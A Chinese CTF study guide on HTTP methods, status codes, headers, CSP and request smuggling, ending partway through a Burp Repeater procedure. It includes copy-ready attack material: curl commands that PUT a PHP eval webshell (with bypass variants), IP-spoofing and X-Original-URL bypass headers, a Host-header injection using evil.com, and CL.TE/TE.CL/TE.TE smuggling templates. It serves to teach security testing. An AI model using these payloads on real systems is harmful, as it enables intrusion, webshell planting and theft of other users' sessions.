## [http] HTTP 协议基础——Web 题绕不开的协议细节：方法、状态码、头字段。
### [http-methods] HTTP 方法与常用场景 | easy | HTTP;请求方法;基础 | http方法;OPTIONS;TRACE
> HTTP 方法全表与 CTF 中的实际用途

#### 这个条目的作用
HTTP 方法（GET/POST/PUT……）告诉服务器「你想对这个资源做什么」。CTF 里多数 Web 题只实现 GET/POST，但有些题会开放 PUT、TRACE 这类冷门方法——方法一旦开放就是拿分点。所以第一件事是搞清楚有哪些方法、怎么探测它们。

#### 前置条件
- 一个能访问的目标 URL（线下赛靶场地址 / 在线题目域名）
- curl（Windows 10+ 自带；macOS/Linux 默认有）或 Burp Suite 的 Repeater
- 浏览器 F12 开发者工具作辅助

#### 第 1 步：记住每个方法在说什么
先背下这张最小表，不需要背 RFC：

| 方法 | 语义 | CTF 用途 |
|---|---|---|
| `GET` | 获取资源 | 最常测，参数直接进 URL |
| `POST` | 提交数据 | 登录、上传、注入的主战场 |
| `PUT` | 上传并替换资源 | **开放即可直接传马** |
| `DELETE` | 删除资源 | 很少考 |
| `HEAD` | 只要响应头 | 探测文件是否存在 |
| `OPTIONS` | 询问支持哪些方法 | 探测 `Allow` 头 |
| `TRACE` | 回显收到的请求 | XST（见第 5 步） |
| `PATCH` | 部分更新 | API 场景 |
| `CONNECT` | 建立隧道 | 代理场景 |

> [!tip] 重点记三个：PUT（传马）、OPTIONS（探测）、TRACE（回显），其余常识性理解。

#### 第 2 步：用 OPTIONS 探测开放的方法
操作：对目标根路径发 OPTIONS 请求。

```bash
curl -sI -X OPTIONS http://target/
```

预期结果：看响应里的 `Allow:` 头，例如 `Allow: GET, HEAD, POST, PUT, OPTIONS`。
含义：`Allow` 列出服务器允许的方法，只要出现 `PUT`/`TRACE`/`DELETE` 这类冷门方法就是额外攻击面。
如果不行：服务器不支持 OPTIONS 会回 405/501 且无 Allow 头——这本身就是信息。

#### 第 3 步：用 HEAD 快速探测文件存在
操作：对猜测的路径发 HEAD 请求。

```bash
curl -I http://target/flag.txt
curl -I http://target/.git/config
```

预期结果：`200` 路径存在，`404` 不存在。
含义：HEAD 只返回响应头、不下载正文，速度快流量小，适合批量扫敏感文件（.git、备份、源码泄露）。
如果不行：个别服务器对 HEAD 处理不标准会回 405，改用 `curl -s --range 0-0 http://target/flag.txt`。

#### 第 4 步：试 PUT 直接传马（重点）
操作：PUT 允许「把请求体写到指定路径」，先探测开放再写测试文件。

```bash
# 试探性写入（成功返回 200/201/204）
curl -X PUT http://target/test.txt --data 'hello'

# 如果允许，直接传一句话木马（PHP 举例）
curl -X PUT http://target/shell.php --data '<?php @eval($_POST["x"]);?>'
```

预期结果：访问 test.txt 能看到 hello，说明 PUT 可用，之后传马用蚁剑连接。
含义：PUT 开放 = 任意文件写入 = 大概率直接 getshell，CTF 里性价比最高的方法漏洞。
如果不行：很多中间件默认关闭 PUT 会回 403/405，先回第 2 步确认 `Allow` 里到底有没有 PUT。

> [!warn] 传马前先确定目标语言：看 `X-Powered-By`。PHP 站传 `.php`，JSP 站传 `.jsp`，静态站传什么后缀都没用。

#### 第 5 步：TRACE 与 XST 是什么
操作：向目标发 TRACE 请求。

```bash
curl -s -X TRACE -i http://target/
```

预期结果：支持的话响应体会原样回显你发送的整个请求（含请求头）。
含义：TRACE 回显请求内容，配合 XSS 可构造 **XST**：让受害者浏览器发出带 HttpOnly Cookie 的请求（JS 读不到但浏览器自动带），TRACE 回显里就能看到该 Cookie。现代浏览器已限制 TRACE，只有服务端支持的老站可能利用。
如果不行：现代服务器基本默认关闭 TRACE，回 405/501 是常态，别花太多时间。

#### 第 6 步：方法混淆绕过
操作：当某个方法被 WAF/鉴权拦截时，试试换写法：

```bash
# 小写方法（部分框架不区分大小写）
curl -X put http://target/shell.php --data '<?php @eval($_POST["x"]);?>'

# X-HTTP-Method-Override 声明真实方法（部分框架支持）
curl -X POST http://target/api/user -H 'X-HTTP-Method-Override: PUT' --data 'name=admin'

# 尾随斜杠 / 路径参数
curl -X PUT 'http://target/shell.php/' --data '<?php @eval($_POST["x"]);?>'
curl -X PUT 'http://target/shell.php;.js' --data '<?php @eval($_POST["x"]);?>'
```

预期结果：部分框架（Express 路由、老 PHP 环境）把 `put` 当 `PUT` 处理，或通过自定义头透传方法。
含义：后端框架「方法名解析」与 WAF「方法名匹配」不一致时，就是绕过点。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| OPTIONS 没有 Allow 头 | 服务器不支持 OPTIONS 或直接 405 | 换 HEAD/GET 探测，或直接试 PUT 看报错 |
| PUT 返回 403/405 | 中间件默认关闭 PUT | 确认 Allow 头；试第 6 步方法混淆 |
| 传的 .php 马访问是纯文本 | 目标不解析 PHP（Java/静态站） | 看 `X-Powered-By` 确定语言，换对应后缀 |
| TRACE 拿不到 Cookie | 现代浏览器禁止 TRACE，服务端多关闭 | 判断为老题/特殊环境再投入时间 |

#### 实战要点
- 拿到靶机先跑 `curl -sI -X OPTIONS http://target/`，成本 1 秒，可能直接暴露 PUT/TRACE。
- PUT 永远先写无害测试文件确认可写再传马，避免误判。
- 方法绕过顺序：小写 → `X-HTTP-Method-Override` → 尾随 `/` → `;.js` 路径参数。
- HEAD 探文件用 `curl -I`，适合脚本批量扫敏感文件。
- `Allow` 头本身就是信息泄露，题目返回它八成在提示你用那个方法。

### [http-status] HTTP 状态码速查 | easy | HTTP;状态码;基础 | 状态码;404 403 302
> 必须记住的状态码及其隐藏含义

#### 这个条目的作用
状态码是服务器在响应行第一句给你的结论（200 成功、404 不存在……）。CTF 里状态码不只是成功/失败指示器——403 和 404 的区别、302 的跳转目标、500 的报错信号，每条都藏着线索。

#### 前置条件
- curl 或浏览器 F12（Network 面板每行都有状态码列）
- 知道怎么看：`curl -i` 的响应第一行就是状态行，如 `HTTP/1.1 200 OK`

#### 第 1 步：2xx——成功
| 码 | 含义 | 备注 |
|---|---|---|
| 200 | OK | 正常 |
| 201 | Created | POST/PUT 成功创建资源 |
| 204 | No Content | 成功但无响应体 |

操作：`curl -s -i http://target/ | head -n 1` 应看到 `HTTP/1.1 200 OK`。
含义：一切正常。题目说「上传成功」但响应是 201/204 也别惊讶，那是创建/无内容的正常信号。

#### 第 2 步：3xx——重定向（重点看 Location）
| 码 | 含义 | 备注 |
|---|---|---|
| 301 | 永久跳转 | 抓包看 Location |
| 302 | 临时跳转 | **登录后跳转、SSRF 跟随** |
| 303 | See Other | 表单提交后跳转 |
| 304 | Not Modified | 命中缓存 |
| 307/308 | 保持方法重定向 | POST 重定向仍是 POST（走私/SSRF 相关） |

操作：`curl -s -i http://target/login | head -n 10`，看状态行和 Location 头。
含义：**Location 是重点**——跳 `/admin` 说明有管理入口，跳外站说明存在开放重定向，登录后 302 到首页说明认证成功。307/308 保持原方法，配合走私/SSRF 有特殊作用。

#### 第 3 步：4xx——客户端错误（403 vs 404 是核心）
| 码 | 含义 | 备注 |
|---|---|---|
| 400 | Bad Request | 参数格式错误；走私常见报错 |
| 401 | Unauthorized | 需认证（带 WWW-Authenticate） |
| 403 | Forbidden | **有资源但无权限** |
| 404 | Not Found | 不存在 |
| 405 | Method Not Allowed | 方法不支持（Allow 头泄露） |
| 429 | Too Many Requests | 触发限频 |

操作：对比访问不存在的路径和受保护路径：
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://target/nonexist123
curl -s -o /dev/null -w '%{http_code}\n' http://target/admin
```
预期结果：不存在回 404，受保护回 403。
含义：**403 = 资源存在、只是没权限**——说明 `/admin` 真实存在，下一步就是绕鉴权（X-Original-URL、伪造 IP、方法混淆等）。这是 4xx 里最值钱的信息。

#### 第 4 步：5xx——服务端错误
| 码 | 含义 | 备注 |
|---|---|---|
| 500 | 内部错误 | 注入/序列化报错信号 |
| 502/504 | 网关错误 | 反向代理连不上后端 |
| 505 | 版本不支持 | HTTP/0.9 等奇特请求 |

操作：往注入点、序列化参数里塞 payload，观察响应码。
含义：正常 200、塞 payload 后变 500 = 后端处理你的输入时抛异常——说明参数进入了危险函数（SQL 拼接、反序列化、模板渲染），**报错本身就是漏洞存在的证据**。502/504 说明存在反代，是走私题的常见环境特征。

#### 第 5 步：用 403/404 差异做路径探测
操作：对每个候选路径各访问一次，比较状态码：
```bash
for p in admin config backup flag; do
  printf '%s: ' $p
  curl -s -o /dev/null -w '%{http_code}\n' http://target/$p
done
```
预期结果：`admin: 403`、`config: 404`。
含义：403 是「存在但被拦」，404 才是真不存在。**三次 404 中间夹一次 403 → 大概率路径被规则拦截而非不存在**，考虑编码绕过（`..%2f`、双写、大小写）再看一次。
如果不行：有些 WAF 对拦截路径统一回 404 伪装，改用响应体内容差异判断。

#### 第 6 步：405 与 Allow 头
操作：`curl -s -i -X PATCH http://target/api/user | head -n 8`。
预期结果：返回 `405 Method Not Allowed` 且带 `Allow: GET, POST`。
含义：405 的 `Allow` 头直接列出允许的方法——如果列出 `PUT`/`DELETE`，立刻按 http-methods 条目去测。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 把 403 当「不存在」放弃 | 403 = 存在但无权限 | 记住：403 比 404 更有价值，去绕鉴权 |
| 302 不看 Location | 跳转目标才是关键 | 每次 3xx 都用 `curl -i` 看 Location |
| 500 以为只是「出错了」 | 500 常是漏洞触发信号 | 回看请求参数，找到触发 payload |
| curl 只显示状态码没显示头 | 没加 `-i` | 用 `-s -i` 或 `-w` 单独格式化输出 |

#### 实战要点
- 记忆口诀：403 存在无权限，404 不存在，302 看 Location，500 是漏洞信号。
- 探测路径时 403/404 分开统计，403 优先处理。
- 每次拿响应先看：状态码 + `Location` + `Allow`，三个信息 10 秒扫完。
- 走私探测时收到 400，说明环境对 CL/TE 双头敏感，不支持走私（见 smuggling 组）。

### [http-headers] HTTP 请求/响应头速查 | easy | HTTP;请求头;响应头 | 请求头;响应头;header注入
> 关键头字段意义与可利用点

#### 这个条目的作用
HTTP 头是请求/响应里的元数据字段，浏览器和服务器靠它们协商内容类型、会话、来源等。CTF 里头的价值在于：**头可以被伪造**——改一个 `X-Forwarded-For` 绕过 IP 限制，加一个 `X-Original-URL` 绕前端鉴权。

#### 前置条件
- 一个目标 URL
- 会用 `curl -H '头: 值'` 加自定义头、`curl -i` 看响应头
- 浏览器 F12 → Network → 点击请求查看 Headers 面板

#### 第 1 步：先看懂请求头（Client → Server）
在 F12 的任意请求里看 Request Headers，对照下表：

| 头 | 意义 | 可利用点 |
|---|---|---|
| `Host` | 虚拟主机名 | **Host 头注入**（密码重置、缓存投毒） |
| `Referer` | 来源页 | 防盗链绕过；CSRF 判断 |
| `User-Agent` | 客户端标识 | 日志投毒写马 |
| `X-Forwarded-For` / `X-Real-IP` | 真实 IP（反代） | **伪造 IP 绕过限制** |
| `X-Original-URL` / `X-Rewrite-URL` | 内部路径 | **绕过前端路径鉴权** |
| `X-Requested-With` | AJAX 标识 | 部分框架据此放行 |
| `Content-Type` | 请求体类型 | 伪造 `application/xml` 触发 XXE、`application/json` 触发 NoSQL |
| `Cookie` | 会话 | 改/伪造/越权 |
| `Authorization` | 认证 | Basic/JWT/Bearer |
| `Range` | 分段请求 | 部分绕过场景 |

含义：请求头是「客户端声明」——服务器可能信也可能不信，信的那部分就是攻击面。`Host`、`Cookie`、`User-Agent` 基本必有，其余按场景出现。

#### 第 2 步：看懂响应头（Server → Client）
看 Response Headers：

| 头 | 意义 | 注意 |
|---|---|---|
| `Server` | 服务器软件与版本 | 指纹，有时带 `(Ubuntu)` 等 |
| `X-Powered-By` | 语言框架 | `PHP/8.1`、`Express` 等 |
| `Set-Cookie` | 下发会话 | **看属性**（HttpOnly/SameSite） |
| `Location` | 跳转地址 | 开放重定向/走私反映 |
| `Content-Length` | 响应体长度 | **走私判据** |
| `Access-Control-Allow-Origin` | CORS 放行 | 反射 Origin = 配置错误 |
| `Strict-Transport-Security` | HSTS | 存在则不能明文降级 |
| `WWW-Authenticate` | 认证方式 | 401 时暴露 |

操作：`curl -sI http://target/` 看响应头清单。
含义：`Server`/`X-Powered-By` 泄露技术栈（决定传什么马、用什么 payload）；`Set-Cookie` 属性决定 XSS/CSRF 难度；`Access-Control-Allow-Origin: *` 或反射 Origin 是 CORS 配置错误。

#### 第 3 步：伪造 IP 绕过 IP 限制
操作：当题目限制「仅本地/内网 IP 可访问」时，加伪造头重放：

```bash
curl -s http://target/admin -H 'X-Forwarded-For: 127.0.0.1'
curl -s http://target/admin -H 'X-Real-IP: 127.0.0.1'
```

多试几个头（不同框架认不同的头）：
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
```

预期结果：原本 403 的页面变成 200。
含义：后端信任反代传来的「真实 IP」头而不校验，直接放行伪造 IP。

#### 第 4 步：X-Original-URL 绕过前端路径鉴权
操作：前端只对 `/admin` 做鉴权、对内部路径不鉴权时这样打：

```bash
curl -s http://target/ -H 'X-Original-URL: /admin'
curl -s http://target/ -H 'X-Rewrite-URL: /admin/real'
```

预期结果：访问看似无害的 `/`，后端却处理了 `/admin`。
含义：前端「看到的路径」和后端「实际处理的路径」不一致 = 鉴权绕过。

> [!info] 前端鉴权绕过三板斧：`X-Original-URL`、`X-Rewrite-URL`（改后端请求路径）；`X-Forwarded-Host`（篡改密码重置链接里的域名）。

#### 第 5 步：Host 头注入
操作：在请求里改 Host 头观察响应/后续行为：
```bash
curl -s http://target/reset -H 'Host: evil.com'
```
预期结果：如果密码重置邮件里的链接变成 `http://evil.com/...`，说明 Host 头被透传到业务逻辑。
含义：业务把 Host 当「网站域名」拼进链接 → 攻击者可控 → 诱导受害者点重置链接，实现密码重置劫持；也可能用于缓存投毒。
如果不行：现代框架多从配置读域名不信任 Host，响应里看不到回显就先别深入。

#### 第 6 步：检查 Set-Cookie 与安全属性
操作：登录后抓 Set-Cookie 响应头：
```bash
curl -s -i http://target/login -d 'user=admin&pass=admin' | grep -i set-cookie
```
含义：无 `HttpOnly` → XSS 能直接读 Cookie；无 `SameSite`/`SameSite=None` → CSRF 风险大；`Secure` 缺失 → 明文 HTTP 下 Cookie 可被嗅探。具体利用看 cookie 组条目。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 加了 X-Forwarded-For 还是 403 | 后端认别的头或根本不信任 | 把第 3 步 6 个头全试一遍 |
| X-Original-URL 无效 | 前端/框架不支持该头 | 换成 `X-Rewrite-URL` 或大小写变体 |
| Host 头改了没反应 | 框架用配置域名 | 别深入，换别的头试 |
| 头随便加就乱试 | 头生效要后端逻辑配合 | 先想清楚「后端会信哪个头」再打 |

#### 实战要点
- 响应头看三样：`Server`/`X-Powered-By`（指纹）、`Set-Cookie`（属性）、`Access-Control-Allow-Origin`（CORS）。
- IP 伪造头一次全加：`X-Forwarded-For: 127.0.0.1` + `X-Real-IP: 127.0.0.1` + `X-Client-IP: 127.0.0.1`。
- 前端鉴权题先试 `X-Original-URL: /admin`，不行再试 `X-Rewrite-URL`。
- 密码重置题必测 Host 头注入。
- `Content-Type` 伪造是 XXE/NoSQL 触发开关，提交 JSON/XML 时注意匹配。

### [http-sec-headers] 安全响应头与 CSP | medium | HTTP;CSP;安全头 | CSP绕过;Content-Security-Policy;安全头检测
> CSP 与安全头的含义、影响 XSS 的方式

#### 这个条目的作用
安全响应头是服务器用来「收紧浏览器行为」的开关：CSP 决定页面能加载哪些脚本、`X-Frame-Options` 决定页面能不能被 iframe 嵌入。CTF 里它们的意义是：**CSP 配置宽松 = XSS 随便打，配置严格 = 需要绕过**。拿响应先看安全头，直接决定 XSS payload 的难度。

#### 前置条件
- 一个会渲染你输入（XSS 候选）的页面
- 会用 `curl -i` 或 F12 查看响应头
- 了解 XSS 基本概念（`<script>alert(1)</script>` 能弹窗）

#### 第 1 步：认识安全头清单
响应头里逐个找：

| 头 | 作用 | 缺失影响 |
|---|---|---|
| `Content-Security-Policy` | 限制可加载资源/脚本来源 | 无 CSP = XSS 更容易 |
| `X-Frame-Options: DENY/SAMEORIGIN` | 禁止 iframe 嵌入 | 缺失 = 点击劫持 |
| `HttpOnly`（Cookie 属性） | JS 不可读 cookie | 缺失 = 直接偷会话 |
| `SameSite`（Cookie 属性） | 限制跨站发送 | 缺失/None = CSRF 风险大 |
| `X-Content-Type-Options: nosniff` | 禁止 MIME 嗅探 | 缺失 = 上传 XSS 面 |
| `Referrer-Policy` | 控制 Referer 泄露 | 影响 token 泄露 |
| `Strict-Transport-Security` | 强制 HTTPS | 缺失可被降级 |

操作：`curl -sI http://target/xss-test` 或 F12 看 Response Headers。
含义：**缺失的头 = 可用的攻击面**。没有 `X-Frame-Options` → 可测点击劫持；Cookie 没 HttpOnly → XSS 直接偷会话。

#### 第 2 步：看懂 CSP 策略
CSP 是 `Content-Security-Policy: 指令 来源` 形式，常见组合：

```
Content-Security-Policy: default-src 'self'          # 只允许同源
Content-Security-Policy: script-src 'self' 'unsafe-inline'   # 允许内联脚本
Content-Security-Policy: script-src 'unsafe-eval'    # 允许 eval
```

操作：找到 CSP 头，拆出 `script-src` 指令（没有 script-src 就看 `default-src`）。
含义：`script-src` 决定脚本从哪来：`'self'` = 只信任同源文件；`'unsafe-inline'` = 允许行内 `<script>` 和 `onclick` 属性；`'unsafe-eval'` = 允许 `eval()`/`new Function()`。**`'unsafe-inline'` 在场 = 常规 XSS 直接打**，这是最常见的宽松配置。

> [!tip] 拿到响应先看 `Content-Security-Policy` 是否存在、`unsafe-inline`/`unsafe-eval` 是否在场，直接决定 XSS payload 难度。

#### 第 3 步：判定「能不能直接弹」
操作：按优先级查 CSP：
```bash
curl -sI http://target/ | grep -i content-security
```
判定逻辑：
1. 没有 CSP 头 → 直接 `onerror=alert(1)` / `<script>alert(1)</script>`。
2. CSP 含 `'unsafe-inline'` → 行内脚本可用，直接打。
3. CSP 只写 `default-src` 没写 `script-src` → script-src 继承 default 的值，仍需看 default 里有没有 `unsafe-inline`。
4. 都没有 → 进入第 4 步找绕过。

含义：多数 CTF 题在 1/2 档就结束了，先试最普通的 payload。

#### 第 4 步：CSP 严格时的绕过思路
当 `script-src` 白名单严格时，按表找缺口：

| 防线 | 绕过 |
|---|---|
| `'unsafe-inline'` 在场 | 直接 `onerror=alert(1)` |
| 只禁 `default-src` | 看 script-src 是否继承/是否含 unsafe-inline |
| 允许某域名 | 找该域名下的上传点/JSONP 作为脚本落点 |
| 允许 `data:` | `<script src=data:text/javascript,alert(1)>` |
| 允许 `https:` | 找目标站 https 下的可控 JSONP |
| 允许 `*.example.com` | 找子域上传/反射点 |
| base-uri 未设置 | `document.baseURI` 投毒 + 相对路径引入恶意脚本 |

操作：把 CSP 头抄下来，对照表找可利用项，构造对应 payload。
含义：CSP 只限制「脚本来源」不限制「业务逻辑」，白名单里的任意可控点（JSONP 接口、上传目录、可控子域）都能变成脚本落地。

#### 第 5 步：检查 X-Frame-Options 与点击劫持
操作：看有没有 `X-Frame-Options` 或 CSP 的 `frame-ancestors`：
```bash
curl -sI http://target/ | grep -iE 'frame|content-security'
```
含义：完全没有相关头 → 页面可被 iframe 嵌入 → 构造透明 iframe 诱导点击（点击劫持），可打「改密、转账」等按钮操作。F12 里 `document.body.innerHTML = '<iframe src="http://target/...">'` 可本地验证能否嵌入。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| CSP 有 `unsafe-inline` 但 `onerror` 不弹 | 被 script-src 之外指令拦（如 `object-src`） | 先只测 `<script>alert(1)</script>` 逐指令排除 |
| 以为 `'self'` 绝对安全 | self 指「同源」，同源下的上传点/JSONP 仍可控 | 找同源可控脚本落点 |
| iframe 白屏 | 有 `X-Frame-Options: DENY` | 有该头就别测点击劫持了 |
| 忽略 `default-src` | 未显式配置的指令都走 default | 没有 script-src 时按 default-src 判断 |

#### 实战要点
- 顺序固定：看有没有 CSP → 有没有 unsafe-inline/unsafe-eval → 没有就找白名单域名的 JSONP/上传点。
- `'unsafe-eval'` 在场意味着 SSTI/动态代码执行面更大，测注入时优先考虑。
- 响应头扫描用 `curl -sI` + grep，10 秒扫完全部安全头。
- Cookie 的 HttpOnly/SameSite 也属于「安全头」检查范围，XSS 题顺手看。
- 点击劫持判据：响应里没有 `X-Frame-Options` 也没有 `frame-ancestors`。

## [smuggling] 请求走私与协议攻击——前后端对 HTTP 解析不一致导致的协议层漏洞。
### [smug-basics] 请求走私原理速查 | hard | 请求走私;HTTP走私;协议攻击 | request smuggling;走私原理
> CL/TE 不一致引发的走私：成因、危害、T 型判定

#### 这个条目的作用
请求走私（Request Smuggling）是「前端代理和后端服务器对同一个请求的边界判定不一致」导致的漏洞：前端以为请求 A 到这里结束，后端却以为还没结束（或反之），于是两个请求的边界错位，恶意内容被拼进别人的请求里。CTF 里它是 hard 档常客，核心就是搞懂 Content-Length 和 Transfer-Encoding 的冲突。

#### 前置条件
- 理解 HTTP 请求基本结构：请求行 + 请求头 + 空行 + 请求体
- 会用 Burp Suite Repeater（推荐）或 curl 发原始请求
- 目标环境确认有前端反向代理 + 后端源站两层结构

#### 第 1 步：理解 Content-Length（CL）怎么切请求
`Content-Length: N` 表示请求体恰好是 N 个字节，服务器读完 N 字节就认为请求结束。

```http
POST /login HTTP/1.1
Host: target
Content-Length: 11

user=admin=1
```

含义：`user=admin=1` 是 11 个字节，读到第 11 字节后这个请求就完了，下一条数据是下一个请求。
关键点：CL 是「**按字节数**」切边界，数错一个字节整个解析就乱。

#### 第 2 步：理解 Transfer-Encoding（TE）怎么切请求
`Transfer-Encoding: chunked` 表示请求体按「块」传输，每块格式是：一行十六进制块大小 + 块内容 + 空行，`0` 块表示结束。

```http
POST /login HTTP/1.1
Host: target
Transfer-Encoding: chunked

4
test
0

```

含义：先读 `4`（十六进制）→ 读 4 字节内容 `test` → 再读 `0` → 请求结束。**边界由块标记决定，跟字节总数无关**。
关键点：TE 是「**按块标记**」切边界，块大小行可以伪造——这就是走私的根源之一。

> [!warn] 注意 `0` 块后的空行：chunked 结束序列是 `0\r\n\r\n`，缺一个 `\r\n` 后端可能把后续内容当块数据继续读，导致请求挂起（这也能当探测信号）。

#### 第 3 步：把两者放一起——冲突怎么产生
RFC 规定：同一请求同时带 CL 和 TE 时，**必须按 TE（chunked）处理**。但不同服务器实现不同：

| 组件 | 可能的行为 |
|---|---|
| 前端（代理/负载均衡） | 按 CL 切，或按 TE 切，或直接 400 拒绝双头 |
| 后端（源站） | 按 TE 切，或按 CL 切 |

典型错位场景（CL.TE）：
- 前端按 **CL** 解析：把整个请求体（含 chunked 标记和后面塞的私货）都当成一个请求的正文，原样转发。
- 后端按 **TE** 解析：读到 chunked 的 `0` 块就认为请求结束，把剩下的私货当成「下一个请求」开始解析。

于是：前端眼里是一个请求，后端眼里是两个请求——后一个请求对前端不可见、不受前端 WAF/鉴权约束，这就是走私的本质。

> [!tip] 记忆：走私 = 「前端认为请求结束的位置」和「后端认为的结束位置」对不上。谁按字节切、谁按块切，决定了是哪一种走私（CL.TE / TE.CL / TE.TE）。

#### 第 4 步：想清楚危害再动手
| 危害 | 说明 |
|---|---|
| 走私其他用户请求 | 打 CDN 缓存投毒 / 窃取他人请求（含会话） |
| 绕过 WAF 与前端鉴权 | 恶意请求被拆进后端认为「合法」的请求里 |
| 把请求拼到下一个用户 | 直接对下一位访问者投毒（响应错位） |
| 内网转发数据 | CL.0 攻击向后端集群转发 |

含义：走私的核心价值是**绕过前端**——前端看不见被走私的请求，WAF、IP 限制、路径鉴权全部失效，后端直接面对恶意请求。

#### 第 5 步：T 型探测——先确认存不存在
操作：发一个请求，里面塞一个走私的 `GET /admin`：

```http
POST / HTTP/1.1
Host: target
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

用 curl 的原始二进制方式发（`$'...'` 让 bash 输出真正的 `\r\n`）：

```bash
curl -s -i http://target/ -H 'Content-Length: 44' -H 'Transfer-Encoding: chunked' \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: X\r\n\r\n'
```

预期结果：随后再发一个正常请求，如果它的响应变成 `/admin` 的内容（404/403 页面或管理页），走私存在。
含义：被走私的 `GET /admin` 被后端当成独立请求处理，而前端完全没看见它——走私成立。
如果不行：服务器直接回 400 → 该环境对「CL+TE 双头」敏感（现代 Nginx/Apache 默认拒绝），不支持走私，别硬试。

#### 第 6 步：时间差法辅助判定
操作：走私一个会让后端「卡住」的请求（chunked 永不结束），然后紧接着发正常请求：

```http
POST / HTTP/1.1
Host: target
Content-Length: 100
Transfer-Encoding: chunked

1
Z

```

含义：后端按 TE 解析时，`1\r\nZ\r\n` 之后没有 `0` 结束块，后端一直等后续块数据；前端按 CL 早就转发完了。此时下一个正常请求的响应会明显变慢或直接超时——**响应时间暴涨 = 两个请求在后端排队/挂起**，是走私的强信号。
如果不行：时间差法对超时阈值敏感，多试几次，或直接用第 5 步的内容比对法（更可靠）。

> [!danger] 走私探测本身可能把请求拼给**其他用户**——真实服务的下一位访问者会收到你的走私请求/响应。线下赛只在靶场/自己的题目环境测，切勿对真实站点乱打。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 发双头请求直接 400 | 现代服务器默认拒绝 CL+TE 并存 | 环境不支持走私，换题目 |
| 走私请求没生效 | CL 字节数算错 | 数准走私 payload 的字节数再填 CL |
| curl 发的 `\n` 不是 `\r\n` | 普通引号字符串里是裸换行 | 用 `$'...\r\n...'` 或 Burp Repeater |
| 响应一直超时 | chunked 没发 `0` 结束块 | 检查 `0\r\n\r\n` 序列是否完整 |
| 没看到第二个请求被拼 | 前端也按 TE 解析 | 换 TE.CL 变体（见 smug-clte） |

#### 实战要点
- 判断顺序：先确认有反代（502/504、反代响应头特征）→ 再测双头是否被 400 拒绝 → 再上 T 型探测。
- CL 值 = 走私 payload 的精确字节数，用 `wc -c` 或 Repeater 状态栏字节数核对。
- `\r\n` 是走私的生命线：所有换行必须是 `\r\n`，用 Repeater 比 curl 更不容易出错。
- 时间差法适合盲判，内容比对法适合确证。
- 现代互联网服务基本都修了双头冲突，这类题几乎只出现在 CTF 靶场和模拟环境。

### [smug-clte] CL.TE / TE.CL / TE.TE 走私 | hard | 请求走私;CL.TE;TE.CL;payload | cl.te;te.cl;te.te;走私payload
> 三类走私的经典 payload 模板

#### 这个条目的作用
走私分三种：CL.TE（前端按 CL、后端按 TE）、TE.CL（反过来）、TE.TE（都按 TE 但混淆其中一个）。本条目给你三类可直接复制进 Burp Repeater 的完整请求模板，以及一步步的操作流程，照着改路径就能用。

#### 前置条件
- 已理解 smug-basics 的 CL/TE 冲突原理
- Burp Suite（Repeater 最顺手），或能用 curl 发原始请求
- 目标环境：前端反代 + 后端源站的两层结构

#### 第 1 步：CL.TE 原理 + 完整模板
原理：前端按 CL 切（整包当一个请求转发），后端按 TE 切（读到 `0` 块结束，剩余当新请求）。

```http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

含义拆解：请求体是 `0\r\n\r\nX` 共 6 字节（前端按 CL=6 全收）；后端按 TE 读到 `0\r\n\r\n` 结束，剩下的 `X` 成为「下一个请求的开头」。

实战模板（走私一个 `GET /admin`）：

```http
POST /search HTTP/1.1
Host: target
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
X: X
```

要点：CL 值必须等于「chunked 部分 + 走私请求」的总字节数（这里给了 150，实际要按你的走私请求内容数准改）。

#### 第 2 步：TE.CL 原理 + 完整模板
原理：前端按 TE 切（chunked），后端按 CL 切（数字节）。

```http
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

含义拆解：前端按 chunked 读：块 `5c`（十六进制 92）字节 = `GPOST /admin ... x=1`，然后 `0` 结束；后端按 CL 只读前 4 字节，把剩下的 `GPOST /admin...` 当成新请求解析——`GPOST` 故意多一个字母 G，使后端报 400/忽略，实际生效的是拆出来的 `/admin` 部分。

> [!warn] `5c` 是十六进制块大小，必须精确等于它后面内容的字节数；数错了后端会把块读穿或读不够。改模板时先数清楚再填。

#### 第 3 步：TE.TE 原理 + 完整模板
原理：前后端都认 TE，但**通过第二个畸形的 TE 头让其中一端失效**，另一端仍按 chunked 解析。

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked   # 第二个 TE 头让一端失效

0

GET /admin HTTP/1.1
Host: target
X: X
```

含义：一端（比如前端）只认 `chunked`，看到第二个头值 `xchunked` 非法就忽略整个 TE、退回按 CL=4 解析；另一端认第一个 TE 头按 chunked 解析——又造成边界错位。

变体（让一端失效的常见写法）：

```
Transfer-Encoding : chunked          # TE 后加空格
Transfer-Encoding: chunked\t         # chunked 后加制表符
Transfer-Encoding: chunked, identity # 逗号追加一个多余值
```

#### 第 4 步：Burp Repeater 完整操作流程
操作：在 Burp 里按以下步骤发走私请求（以 CL.TE 为例）：

1. **关闭自动 CL 重算**：把模板粘贴进 Repeater 后，找到请求编辑区上方的 **「Update Content-Length」勾选框并取消勾选**。Repeater 默认会按你编辑后的内容自动重算 CL，把你手工写好的 CL 值改掉、直接毁掉走私 payload。
2. **粘贴完整模板**：请求行、Host、CL、TE、空行、`0`、空行、走私请求，逐行原样粘贴。每行之间的换行必须是 `\r\n`，Repeater 里就是普通回车换行，别手动敲空格。
3. **核对 CL 值**：CL 必须等于走私 payload 的总字节数。在 Repeater 里选中 body 看状态栏字节数，或 `printf '%s' '...' | wc -c` 核对，不对就改。
